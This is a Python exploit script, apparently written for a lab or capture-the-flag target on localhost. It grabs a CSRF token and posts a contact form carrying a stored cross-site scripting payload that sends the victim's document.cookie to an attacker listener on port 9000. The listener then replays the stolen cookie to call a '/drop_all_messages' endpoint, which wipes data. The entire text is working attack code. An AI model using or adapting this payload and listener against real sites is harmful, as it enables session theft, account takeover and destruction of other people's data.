from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import requests

TARGET = "https://localhost:8443"
def send_form(s,url, data):
    response = s.post(
        url,
        data=data,
        timeout=10,
        verify=False
    )
    return response


def get_token(s):
    response = s.get(TARGET, timeout=10, verify=False)
    html = response.text

    marker = 'name="csrf_token"'
    idx = html.find(marker)
    if idx == -1:
        return None

    value_marker = 'value="'
    value_start = html.rfind(value_marker, 0, idx)
    if value_start == -1:
        return None

    value_start += len(value_marker)
    value_end = html.find('"', value_start)

    return html[value_start:value_end]

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        qs = parse_qs(urlparse(self.path).query)
        cookie = qs.get("cookie", [""])[0]

        print("[+] Got cookie:", cookie)

        if cookie:
            r = requests.get(
                TARGET + "/drop_all_messages",
                headers={"Cookie": cookie},
                verify=False
            )
            print("[+] Drop status:", r.status_code)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
def main():
    s = requests.Session()
    token = get_token(s)
    if not token:
        print("Failed to get token")
        return

    DATA = {
        "name": "User",
        "email": "example@gmail.com",
        "subject": "sss",
        "phone_number": "0577777777",
        "message": "<iframe srcdoc='<script>fetch(\"http://localhost:9000/?cookie=\"+document.cookie)</script>'></iframe>",
        "csrf_token": token
    }

    send_form(s, TARGET + "/request", DATA)

    server = HTTPServer(("localhost", 9000), Handler)
    print("[*] Server listening on http://localhost:9000")
    server.serve_forever()


if __name__ == "__main__":
    main()